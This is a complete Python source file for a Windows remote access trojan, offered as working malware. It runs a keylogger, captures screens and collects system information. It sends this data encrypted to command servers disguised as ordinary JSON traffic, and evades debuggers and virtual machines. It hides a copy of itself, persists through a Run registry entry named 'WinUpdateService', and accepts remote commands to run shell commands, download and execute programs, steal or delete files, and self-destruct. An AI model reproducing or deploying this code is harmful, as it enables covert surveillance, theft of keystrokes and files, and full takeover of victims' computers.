import os, sys, ctypes, hashlib, random, string, time, json, base64, socket, platform, subprocess, requests, psutil, winreg
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from pynput import keyboard
from PIL import ImageGrab
import threading
import uuid

# CONFIG
PASSWORD = "YourStrongPassword"
SERVER_URLS = ["http://127.0.0.1:5000/api", "http://127.0.0.1:5001/api"]  # Multi-server fallback
KEY = hashlib.sha256(PASSWORD.encode()).digest()
HIDDEN_DIR = os.path.join(os.getenv("APPDATA"), ".cache")
PERSISTENCE_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
PERSISTENCE_NAME = "WinUpdateService"

# Globals
keylog_buffer = []
keylog_lock = threading.Lock()
MAX_KEYLOG_BATCH = 20
KEYLOG_FLUSH_TIME = 60
last_keylog_flush = time.time()

# --- UTILS ---

def encrypt(data):
    nonce = os.urandom(12)
    return nonce + AESGCM(KEY).encrypt(nonce, data, None)

def decrypt(data):
    return AESGCM(KEY).decrypt(data[:12], data[12:], None)

def random_string(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def stealth_headers():
    # Mimic legitimate app JSON POST headers
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Windows NT 10.0; WOW64)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    ]
    return {
        "User-Agent": random.choice(user_agents),
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
    }

# --- ANTI-ANALYSIS & FINGERPRINTING ---

def is_debugger_present():
    # Basic Windows API check
    try:
        return ctypes.windll.kernel32.IsDebuggerPresent() != 0
    except:
        return False

def timing_jitter_check():
    start = time.perf_counter()
    time.sleep(0.1 + random.uniform(-0.02, 0.02))
    delta = time.perf_counter() - start
    return delta < 0.095 or delta > 0.125

def mouse_movement_check():
    # Simple check for mouse movement within short time
    try:
        import ctypes.wintypes
        user32 = ctypes.windll.user32
        pos1 = ctypes.wintypes.POINT()
        pos2 = ctypes.wintypes.POINT()
        user32.GetCursorPos(ctypes.byref(pos1))
        time.sleep(0.5)
        user32.GetCursorPos(ctypes.byref(pos2))
        return pos1.x != pos2.x or pos1.y != pos2.y
    except:
        return False

def is_running_in_vm():
    indicators = ["vbox", "vmware", "hyper-v", "virtual", "qemu"]
    system_lower = platform.system().lower()
    node_lower = platform.node().lower()
    if any(ind in system_lower for ind in indicators) or any(ind in node_lower for ind in indicators):
        return True
    for _, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            mac_prefixes = ["00:05:69", "00:0C:29", "00:1C:14", "00:50:56"]
            if any(addr.address.upper().startswith(prefix) for prefix in mac_prefixes):
                return True
    return False

def hardware_fingerprint():
    # Gather hardware info for client fingerprinting
    try:
        cpu = platform.processor()
        mac = ':'.join(['%02x' % (uuid.getnode() >> ele & 0xff) for ele in range(0,8*6,8)][::-1])
        ram = psutil.virtual_memory().total
        disk = psutil.disk_usage('/').total
        gpu = "Unknown"  # Placeholder for GPU detection, can use WMI or third-party
        return {"cpu": cpu, "mac": mac, "ram": ram, "disk": disk, "gpu": gpu}
    except:
        return {}

# --- SELF-PROTECTION (PLACEHOLDERS) ---

def validate_integrity():
    # Simple checksum placeholder for self-protection
    # e.g., compute hash of own executable, compare with expected value (not implemented)
    return True

def api_hook_detection():
    # Placeholder for detecting common API hooking (e.g., Check for trampolines)
    # Could be implemented with native code or specialized libs
    return False

# --- KEYLOGGING ---

def keylogger_thread():
    def on_press(key):
        with keylog_lock:
            try:
                if hasattr(key, "char") and key.char:
                    keylog_buffer.append(key.char)
                else:
                    keylog_buffer.append(f"[{key.name}]")
            except:
                pass
    keyboard.Listener(on_press=on_press).start()

def flush_keylog():
    global last_keylog_flush
    with keylog_lock:
        data = ''.join(keylog_buffer)
        keylog_buffer.clear()
    last_keylog_flush = time.time()
    return data

# --- CORE FUNCTIONS ---

def take_screenshot():
    try:
        from io import BytesIO
        img = ImageGrab.grab()
        buf = BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()
    except:
        return None

def system_info():
    try:
        uname = platform.uname()
        return {
            "system": uname.system,
            "node": uname.node,
            "release": uname.release,
            "version": uname.version,
            "machine": uname.machine,
            "processor": uname.processor,
        }
    except:
        return {}

def network_info():
    try:
        addrs = psutil.net_if_addrs()
        return {iface: [str(addr.address) for addr in addrs[iface]] for iface in addrs}
    except:
        return {}

def send_result(client_id, action, result):
    payload = {
        "client_id": client_id,
        "action": action,
        "result": result,
        "timestamp": datetime.utcnow().isoformat(),
        "fingerprint": hardware_fingerprint()
    }
    data_json = json.dumps(payload)
    enc = encrypt(data_json.encode())

    for url in SERVER_URLS:
        try:
            # Protocol mimic: send as JSON with padding
            fake_json = {
                "data": base64.b64encode(enc).decode(),
                "padding": random_string(random.randint(5, 20))
            }
            resp = requests.post(url, json=fake_json, headers=stealth_headers(), timeout=20)
            if resp.status_code == 200:
                return True
        except:
            continue
    return False

def communicate_loop():
    client_id = f"{socket.gethostname()}_{os.getpid()}_{uuid.uuid4()}"
    keylogger_thread()
    while True:
        if not validate_integrity() or api_hook_detection():
            time.sleep(random.randint(600, 1200))
            continue

        # Advanced VM/Sandbox checks
        if (is_debugger_present() or is_running_in_vm() or timing_jitter_check() or not mouse_movement_check()):
            time.sleep(random.randint(600, 1200))
            continue

        keylog_data = ""
        if len(keylog_buffer) >= MAX_KEYLOG_BATCH or (time.time() - last_keylog_flush) > KEYLOG_FLUSH_TIME:
            keylog_data = flush_keylog()

        heartbeat_payload = {
            "client_id": client_id,
            "action": "heartbeat",
            "timestamp": datetime.utcnow().isoformat(),
            "keylog": keylog_data,
            "fingerprint": hardware_fingerprint(),
            "system_info": system_info(),
            "network_info": network_info(),
        }

        data_json = json.dumps(heartbeat_payload)
        enc = encrypt(data_json.encode())

        success = False
        for url in SERVER_URLS:
            try:
                fake_json = {
                    "data": base64.b64encode(enc).decode(),
                    "padding": random_string(random.randint(5, 20))
                }
                resp = requests.post(url, json=fake_json, headers=stealth_headers(), timeout=20)
                if resp.status_code != 200:
                    continue
                enc_resp = base64.b64decode(resp.content)
                dec_resp = json.loads(decrypt(enc_resp))
                cmd = dec_resp.get("command")
                if cmd:
                    handle_command(client_id, cmd)
                success = True
                break
            except:
                continue

        if not success:
            time.sleep(random.randint(30, 60))
        time.sleep(random.randint(45, 90))


def handle_command(client_id, cmd):
    parts = cmd.split(' ', 2)
    base_cmd = parts[0].lower()

    if base_cmd == "exit" or base_cmd == "self_destruct":
        self_destruct()

    elif base_cmd == "shell" and len(parts) > 1:
        try:
            result = subprocess.getoutput(parts[1])
        except Exception as e:
            result = f"Shell command error: {str(e)}"
        send_result(client_id, "shell_result", result)

    elif base_cmd == "screenshot":
        img = take_screenshot()
        if img:
            send_result(client_id, "screenshot", base64.b64encode(img).decode())
        else:
            send_result(client_id, "error", "Screenshot failed.")

    elif base_cmd == "processes":
        try:
            processes = [p.info for p in psutil.process_iter(attrs=["pid", "name"])][:20]
            send_result(client_id, "process_list", json.dumps(processes))
        except Exception as e:
            send_result(client_id, "error", f"Processes error: {str(e)}")

    elif base_cmd == "download_execute" and len(parts) > 1:
        url = parts[1]
        try:
            r = requests.get(url, timeout=30)
            exe_path = os.path.join(HIDDEN_DIR, random_string(10) + ".exe")
            with open(exe_path, 'wb') as f:
                f.write(r.content)
            subprocess.Popen(exe_path, creationflags=subprocess.CREATE_NO_WINDOW)
            send_result(client_id, "download_execute", f"Executed {url}")
        except Exception as e:
            send_result(client_id, "error", f"Download/execute error: {str(e)}")

    elif base_cmd == "remove_persistence":
        remove_persistence()
        send_result(client_id, "remove_persistence", "Persistence removed")

    elif base_cmd == "sysinfo":
        si = system_info()
        send_result(client_id, "sysinfo", json.dumps(si))

    elif base_cmd == "netinfo":
        ni = network_info()
        send_result(client_id, "netinfo", json.dumps(ni))

    elif base_cmd == "download" and len(parts) > 2:
        filepath = parts[1]
        base64_data = parts[2]
        try:
            with open(filepath, 'wb') as f:
                f.write(base64.b64decode(base64_data))
            send_result(client_id, "download", f"File saved: {filepath}")
        except Exception as e:
            send_result(client_id, "error", f"Download error: {str(e)}")

    elif base_cmd == "upload" and len(parts) > 1:
        filepath = parts[1]
        try:
            with open(filepath, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            send_result(client_id, "upload", data)
        except Exception as e:
            send_result(client_id, "error", f"Upload error: {str(e)}")

    elif base_cmd == "delete" and len(parts) > 1:
        filepath = parts[1]
        try:
            os.remove(filepath)
            send_result(client_id, "delete", f"Deleted: {filepath}")
        except Exception as e:
            send_result(client_id, "error", f"Delete error: {str(e)}")

    else:
        send_result(client_id, "error", f"Unknown command: {cmd}")


def run_stealth():
    mutex_name = "Global\\MyStealthMutex"
    if not create_mutex(mutex_name):
        sys.exit(0)

    dest_path = os.path.join(HIDDEN_DIR, os.path.basename(sys.executable))
    if sys.executable.lower() != dest_path.lower():
        new_path = copy_to_hidden()
        if new_path:
            set_persistence(new_path)
            subprocess.Popen([new_path], creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)

def create_mutex(name):
    handle = ctypes.windll.kernel32.CreateMutexW(None, False, name)
    return handle != 0 and ctypes.GetLastError() != 183

def copy_to_hidden():
    if not os.path.exists(HIDDEN_DIR): os.makedirs(HIDDEN_DIR, exist_ok=True)
    exe_name = random_string(10) + ".exe"
    dest = os.path.join(HIDDEN_DIR, exe_name)
    if not os.path.exists(dest):
        try:
            import shutil
            shutil.copy2(sys.executable, dest)
            ctypes.windll.kernel32.SetFileAttributesW(dest, 0x02 | 0x04)  # Hidden + System
            return dest
        except:
            return None
    return dest

def set_persistence(exe_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSISTENCE_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, PERSISTENCE_NAME, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass

def remove_persistence():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSISTENCE_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, PERSISTENCE_NAME)
        winreg.CloseKey(key)
    except:
        pass

def self_destruct():
    remove_persistence()
    try:
        os.remove(sys.executable)
    except:
        pass
    sys.exit(0)


if __name__ == "__main__":
    run_stealth()
    communicate_loop()
